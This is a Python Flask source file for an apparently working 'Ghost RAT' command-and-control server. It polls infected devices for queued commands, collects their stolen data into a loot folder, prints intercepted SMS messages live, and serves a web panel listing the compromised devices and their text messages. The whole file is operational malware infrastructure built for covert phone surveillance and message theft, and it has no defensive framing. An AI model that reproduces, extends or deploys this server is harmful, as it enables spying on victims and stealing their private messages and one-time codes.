# Ghost RAT Server - Developed Adibhai
from flask import Flask, request, jsonify, render_template_string
import os, sys, json, time

CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.json")

try:
    with open(CONFIG_PATH) as f:
        CFG = json.load(f)
except Exception:
    print("[!] config.json nahi mila. Pehle 'bash setup.sh' chalao.")
    sys.exit(1)

USERNAME = CFG.get("username", "User")
PORT     = int(CFG.get("port", 8443))
AUTH_KEY = CFG.get("auth_key", "")

if not AUTH_KEY:
    print("[!] AUTH_KEY khali. setup.sh dobara chalao.")
    sys.exit(1)

app = Flask(__name__)
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

DEVICES = {}
EVENTS  = []

def log(kind, dev, data):
    e = {"t": time.strftime("%H:%M:%S"), "kind": kind, "dev": dev, "data": data}
    EVENTS.append(e)
    if len(EVENTS) > 400: EVENTS.pop(0)
    print("[%s] %-10s %-8s %s" % (e['t'], kind, dev[:8], str(data)[:160]))

def auth(req):
    return req.headers.get("X-Auth") == AUTH_KEY or req.args.get("k") == AUTH_KEY

def bucket(did):
    if did not in DEVICES:
        DEVICES[did] = {"queue": [], "info": {}, "sms": []}
    return DEVICES[did]

@app.route("/ghost/poll")
def poll():
    if not auth(request): return "denied", 403
    did = request.args.get("id", "unknown")
    d = bucket(did)
    if not d["info"]:
        log("NEW_DEVICE", did, request.remote_addr)
    d["info"] = {"ip": request.remote_addr, "last": time.strftime("%Y-%m-%d %H:%M:%S")}
    cmd = d["queue"].pop(0) if d["queue"] else None
    return jsonify({"cmd": cmd})

@app.route("/ghost/data", methods=["POST"])
def data():
    if not auth(request): return "denied", 403
    did  = request.args.get("id", "unknown")
    kind = request.args.get("kind", "misc")
    payload = request.get_json(silent=True) or {}
    d = bucket(did)
    if kind == "sms_live":
        cur = d["sms"] or []
        incoming = payload if isinstance(payload, list) else [payload]
        cur.extend(incoming)
        d["sms"] = cur[-200:]
        for s in incoming:
            print("")
            print("=" * 60)
            print("  SMS FROM: %s" % s.get("from"))
            print("  TIME:     %s" % time.strftime("%H:%M:%S"))
            print("  BODY:     %s" % s.get("body"))
            print("=" * 60)
        log("SMS_LIVE", did, payload)
        return "ok"
    log(kind.upper(), did, payload)
    return "ok"

@app.route("/SMS")
def slash_sms():
    did = request.args.get("did", "")
    n   = int(request.args.get("n", "30"))
    if not did:
        devs = list(DEVICES.keys())
        body = "usage: /SMS?did=DEVICE_ID\n\nknown devices:\n" + \
               "\n".join("  " + d for d in devs) if devs else "no devices yet"
        return "<pre style='background:#000;color:#7cf7a0;padding:16px'>" + body + "</pre>"
    d = DEVICES.get(did)
    if not d:
        return "<pre style='background:#000;color:#f77;padding:16px'>device %s not found</pre>" % did
    arr = d.get("sms") or []
    if not arr:
        return "<pre style='background:#000;color:#c9f7d0;padding:16px'>no SMS yet</pre>"
    lines = []
    for s in arr[-n:]:
        ts = s.get("ts") or 0
        t = time.strftime("%H:%M:%S", time.localtime(ts / 1000.0))
        lines.append("[%s]  %-20s  ->  %s" % (t, s.get("from"), s.get("body")))
    return "<pre style='background:#000;color:#c9f7d0;padding:16px;font-family:monospace'>" + "\n".join(lines) + "</pre>"

PANEL = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Ghost RAT - __USER__</title>
<style>body{background:#0b0d10;color:#c9f7d0;font-family:monospace;margin:0;padding:20px}
h1,h3{color:#7cf7a0}.card{background:#131820;border:1px solid #1f2a33;border-radius:8px;padding:14px;margin:12px 0}
.dev{margin:6px 0;padding:10px;background:#0f141a;border-left:3px solid #7cf7a0}
pre{background:#000;padding:12px;border-radius:6px;max-height:500px;overflow:auto;font-size:13px;line-height:1.6}
.sms{color:#ffd166;display:block;margin:6px 0;padding:6px;border-left:2px solid #ffd166}</style></head><body>
<h1>Ghost RAT - __USER__</h1>
<div class="card"><h3>Devices</h3><div id="devs">loading...</div></div>
<div class="card"><h3>Live SMS</h3><pre id="smsfeed">waiting...</pre></div>
<div class="card"><h3>Events</h3><pre id="feed">waiting...</pre></div>
<script>
let selectedDid='';
async function refresh(){
 const d=await(await fetch('/api/devices')).json();
 let h='';
 for(const [id,v] of Object.entries(d)){h+='<div class="dev"><b>'+id+'</b><div style="color:#5a7c66;font-size:12px">'+JSON.stringify(v.info)+'</div>SMS: '+((v.sms||[]).length)+'</div>';}
 document.getElementById('devs').innerHTML=h||'no devices';
 const ev=await(await fetch('/api/events')).json();
 document.getElementById('feed').textContent=ev.map(e=>'['+e.t+'] '+e.kind+' '+e.dev.slice(0,8)).join('\\n')||'no events';
 const keys=Object.keys(d); if(keys.length&&!selectedDid)selectedDid=keys[0];
 if(selectedDid&&d[selectedDid]){const arr=d[selectedDid].sms||[];
  document.getElementById('smsfeed').innerHTML=arr.slice(-30).map(s=>'<span class="sms">['+new Date(s.ts||0).toLocaleTimeString()+'] '+s.from+'\\n'+s.body+'</span>').join('')||'no SMS';}
}
setInterval(refresh,3000);refresh();
</script></body></html>"""

@app.route("/")
def panel():
    return render_template_string(PANEL.replace("__USER__", USERNAME))

@app.route("/api/devices")
def api_devices(): return jsonify(DEVICES)

@app.route("/api/events")
def api_events(): return jsonify(EVENTS[-80:])

if __name__ == "__main__":
    print("")
    print("=" * 60)
    print("  GHOST RAT — %s" % USERNAME)
    print("=" * 60)
    print("  Port:       %d" % PORT)
    print("  AUTH_KEY:   %s" % AUTH_KEY)
    print("  /SMS view:  http://localhost:%d/SMS?did=<device_id>" % PORT)
    print("")
    app.run(host="0.0.0.0", port=PORT, threaded=True)
